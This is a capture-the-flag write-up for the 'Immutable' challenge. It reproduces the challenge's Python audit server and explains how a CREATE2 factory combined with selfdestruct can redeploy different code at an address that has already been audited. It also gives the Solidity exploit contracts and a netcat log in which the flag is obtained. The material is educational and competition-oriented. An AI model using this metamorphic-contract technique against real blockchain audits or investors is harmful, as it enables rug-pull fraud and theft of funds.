# Immutable [17 solves] [372 points]  

### Description
```
Code is law, and whatever's on the blockchain can never be changed.

nc chall.polygl0ts.ch 4700
```

The objective of this challenge is to change the code of a deployed contract

### immutable.py
```python
#!/usr/bin/env -S python3 -u

LOCAL = False # Set this to true if you want to test with a local hardhat node, for instance

#############################

import os.path, hashlib, hmac
BASE_PATH = os.path.abspath(os.path.dirname(__file__))

with open(os.path.join(BASE_PATH, "key")) as f:
    KEY = bytes.fromhex(f.read().strip())

if LOCAL:
    from web3.auto import w3 as web3
else:
    from web3 import Web3, HTTPProvider
    web3 = Web3(HTTPProvider("https://rinkeby.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"))

def gib_flag():
    with open(os.path.join(BASE_PATH, "flag.txt")) as f:
        print(f.read().strip())

def auth(addr):
    H = hmac.new(KEY, f"{int(addr, 16):40x}".encode(), hashlib.blake2b)
    return H.hexdigest()

def audit():
    addr = input("Where is your contract? ")
    code = web3.eth.get_code(addr)
    if not code:
        print("Haha, very funny, a contract without code...")
        return
    if target(addr) in code:
        print("Oh, you criminal!")
    else:
        print("Alright then, here's some proof that that contract is trustworthy")
        print(auth(addr))

def target(addr):
    return hashlib.sha256(f"{int(addr, 16):40x}||I will steal all your flags!".encode()).digest()

def rugpull():
    addr = input("Where is your contract? ")
    proof = input("Prove you're not a criminal please.\n> ")
    if auth(addr) != proof:
        print("I don't trust you, I won't invest in your monkeys")
        return
    print("Oh, that looks like a cool and safe project!")
    print("I'll invest all my monopoly money into this!")
    code = web3.eth.get_code(addr)
    if target(addr) in code:
        gib_flag()
    else:
        print("Oh, I guess my money actually *is* safe, somewhat...")

if __name__ == "__main__":
    choice = input("""What do you want to do?
1. Perform an audit
2. Pull the rug
3. Exit
> """).strip()
    {"1": audit, "2": rugpull}.get(choice, exit)()
```

First, we have to submit the contract address to `Perform an audit`, which will give us a proof of the contract that we will need it later for the `Pull the rug`.

It requires at the point `target(addr)` is not in the contract code.

But in `Pull the rug`, we have to change the contract code to have `target(addr)` inside the code in order to get the flag.

It is possible to change a deployed contract's code with a factory contract that has `selfdestruct()` feature, and is deployed with same salt using CREATE2.

Contract address can be pre-computed, for a contract deployed with CREATE, it takes in the factory contract's address and the nonce.

With CREATE2, we can re-deploy to the same address with same salt and same code, so we can deploy the factory contract with CREATE2 then use the factory contract to create a contract with CREATE.

Then submit the deployed contract to `Perform an audit`, it will return the proof for that contract address which we will use later.

After we get the proof, run `selfdestruct()` on both the deployed contract and the factory cotnract, after the factory contract ran `selfdestruct()`, its nonce will be reset.

Then on the factory contract that deployed the another factory contract with CREATE2, deploy the factory contract again with same salt using CREATE2. Then the deployed factory contract will be able to deploy another contract containing `target(addr)` to the same address we submitted, as its nonce has been reset.

Finally, the same address we submitted will has different code that contains `target(addr)`, so we can submit it for `Pull the rug` and get the flag.

### exploit.sol :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract contract1 {
    function destruct() public {
        selfdestruct(payable(0x0590C193Aa1E23849263FF52Ef769F4CDdb6e947));
    }
}

contract contract2 {
    constructor(bytes memory code) { assembly { return (add(code, 0x20), mload(code)) } }
}

contract contractFactory {
    contract1 public instance;
    contract2 public instance2;

    function deploy() public {
        instance = new contract1();
    }

    function deploy2(bytes memory a) public {
        instance2 = new contract2(a);
    }

    function destruct() public {
        instance.destruct();
    }

    function destructItself() public {
        selfdestruct(payable(0x0590C193Aa1E23849263FF52Ef769F4CDdb6e947));
    }
}

contract factoryFactory {
    contractFactory public factory;

    function deployFactory() public {
        factory = new contractFactory{salt: keccak256("kaiziron")}();
    }

    function deployContract1() public {
        factory.deploy();
    }

    function deployContract2(bytes memory proof) public {
        factory.deploy2(proof);
    }

    function factoryDestruct() public {
        factory.destruct();
        factory.destructItself();
    }
}
```

### Flag : 

```
# nc chall.polygl0ts.ch 4700
What do you want to do?
1. Perform an audit
2. Pull the rug
3. Exit
> 1
Where is your contract? 0xc0FCf32F0EfC91dcd51f646E0a1E97E3B8B2098B
Alright then, here's some proof that that contract is trustworthy
916e028fd1a6c6ec1d0cdcde4b8588f2134a8fd78feb5d824e7f90cc31e26e5657e63d7312704d31bdbfa0b2a01e1004580888a5b41ef1b90eb800ef97c18e15

# nc chall.polygl0ts.ch 4700
What do you want to do?
1. Perform an audit
2. Pull the rug
3. Exit
> 2                                         
Where is your contract? 0xc0FCf32F0EfC91dcd51f646E0a1E97E3B8B2098B
Prove you're not a criminal please.
> 916e028fd1a6c6ec1d0cdcde4b8588f2134a8fd78feb5d824e7f90cc31e26e5657e63d7312704d31bdbfa0b2a01e1004580888a5b41ef1b90eb800ef97c18e15
Oh, that looks like a cool and safe project!
I'll invest all my monopoly money into this!
EPFL{https://youtu.be/ZgWkdQDBqiQ}
```